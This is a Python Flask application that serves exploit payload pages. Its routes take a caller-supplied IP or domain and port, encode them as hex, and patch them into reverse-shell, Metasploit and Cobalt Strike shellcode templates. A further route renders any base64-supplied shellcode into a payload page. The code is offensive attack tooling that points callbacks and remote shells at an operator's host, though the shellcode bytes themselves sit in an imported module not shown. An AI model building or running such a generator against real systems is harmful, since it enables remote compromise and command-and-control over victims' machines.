#! coding=utf-8

import sys
sys.dont_write_bytecode = True

import base64
import socket
from ipaddress import ip_address, AddressValueError

from shellcode import *
from flask import Flask, render_template, jsonify


app = Flask(__name__)


def is_valid_ip(ip):
    # 判断是否是IP地址
    try:
        ip_address(ip)
        return True
    except AddressValueError:
        return False

def resolve_dns(hostname):
    # 把域名解析为IP
    try:
        ip = socket.gethostbyname(hostname)
        return ip
    except socket.gaierror:
        return None

def port_to_hex_little_endian(port):
    # 将端口转换为小端的 16 进制
    return [port & 0xff, port >> 8]

def port_to_hex_big_endian(port):
    # 将端口转换为大端的 16 进制
    return [port >> 8, port & 0xff]

def process_ip_port_tcp(ip, port):
    # 判断是否是IP地址还是域名，如果是域名，解析为IP地址。
    if not is_valid_ip(ip):
        resolved_ip = resolve_dns(ip)
        if resolved_ip is not None:
            ip = resolved_ip
        else:
            return None, None

    # 将 IP 地址转换为 16 进制
    hex_ip = ','.join([f'0x{int(octet):02x}' for octet in ip.split('.')])

    # 将端口号转换为大端的 16 进制
    hex_port = ','.join([f'0x{num:02x}' for num in port_to_hex_big_endian(port)])

    return hex_ip, hex_port

def process_ip_port_http(ip, port):

    # 由于是http的，直接把IP或者域名转换为16进制即可
    # 将 IP 地址转换为 16 进制
    hex_ip = ','.join([f'0x{ord(char):02x}' for char in ip])

    # 将端口号转换为小端的 16 进制
    hex_port = ','.join([f'0x{num:02x}' for num in port_to_hex_little_endian(port)])

    return hex_ip, hex_port


@app.route("/")
def index():
    return render_template('index.html')

@app.route("/calc")
def calc():
    return render_template('payload.html', shellcode = SHELLCODE_CALC)

@app.route("/shell/<ip>/<int:port>", methods=['GET'])
def shell(ip, port):

    hex_ip, hex_port = process_ip_port_tcp(ip, port)
    
    if hex_ip is None or hex_port is None:
        return jsonify({
            'error': '无效的IP地址或域名',
            'message': '请提供一个有效的 IP 地址或可解析的域名。'
        })
    
    shellcode = SHELLCODE_SHELL
    shellcode = shellcode.replace(IP_HEX_TCP, hex_ip)
    shellcode = shellcode.replace(PORT_HEX_TCP, hex_port)
    
    return render_template('payload.html', shellcode = shellcode)

@app.route("/msf/<mode>/<ip>/<int:port>", methods=['GET'])
def msf(mode, ip, port):
    shellcode = ""

    if mode == "tcp":
        shellcode = SHELLCODE_MSF_TCP
        hex_ip, hex_port = process_ip_port_tcp(ip, port)
        if hex_ip is None or hex_port is None:
            return jsonify({
                'error': '无效的IP地址或域名',
                'message': '请提供一个有效的 IP 地址或可解析的域名。'
            })
        shellcode = shellcode.replace(IP_HEX_TCP, hex_ip)
        shellcode = shellcode.replace(PORT_HEX_TCP, hex_port)

    elif mode == "http":
        shellcode = SHELLCODE_MSF_HTTP
        hex_ip, hex_port = process_ip_port_http(ip, port)
        shellcode = shellcode.replace(IP_HEX_HTTP, hex_ip)
        shellcode = shellcode.replace(PORT_HEX_HTTP, hex_port)

    elif mode == "https":
        shellcode = SHELLCODE_MSF_HTTPS
        hex_ip, hex_port = process_ip_port_http(ip, port)
        shellcode = shellcode.replace(IP_HEX_HTTP, hex_ip)
        shellcode = shellcode.replace(PORT_HEX_HTTP, hex_port)

    else:
        return jsonify({
                'error': '无效的payload格式',
                'message': '请提供一个有效的 payload 格式, 支持 tcp/http/https。'
            })
    return render_template('payload.html', shellcode = shellcode)


@app.route("/cs/<mode>/<ip>/<int:port>", methods=['GET'])
def cs(mode, ip, port):
    shellcode = ""

    if mode == "http":
        shellcode = SHELLCODE_CS_HTTP
        hex_ip, hex_port = process_ip_port_http(ip, port)
        shellcode = shellcode.replace(IP_HEX_HTTP, hex_ip)
        shellcode = shellcode.replace(PORT_HEX_HTTP, hex_port)

    elif mode == "https":
        shellcode = SHELLCODE_CS_HTTPS
        hex_ip, hex_port = process_ip_port_http(ip, port)
        shellcode = shellcode.replace(IP_HEX_HTTP, hex_ip)
        shellcode = shellcode.replace(PORT_HEX_HTTP, hex_port)
    else:
        return jsonify({
                'error': '无效的payload格式',
                'message': '请提供一个有效的 payload 格式, 支持 http/https。'
            })
    return render_template('payload.html', shellcode = shellcode)


@app.route("/shellcode/<base64_shellcode>", methods=['GET'])
def shellcode(base64_shellcode):
    try:
        # 对接收到的 base64 编码的 shellcode 进行解码
        shellcode = base64.b64decode(base64_shellcode).decode('utf-8')
    except Exception as e:
        # 如果解码失败，返回 JSON 响应
        return jsonify({
            'error': 'Base64 解码失败',
            'message': '请提供正确的base64编码后的shellcode。'
        })

    return render_template('payload.html', shellcode = shellcode)

if __name__ == "__main__":
    app.run(debug=False, port=80, host='0.0.0.0')

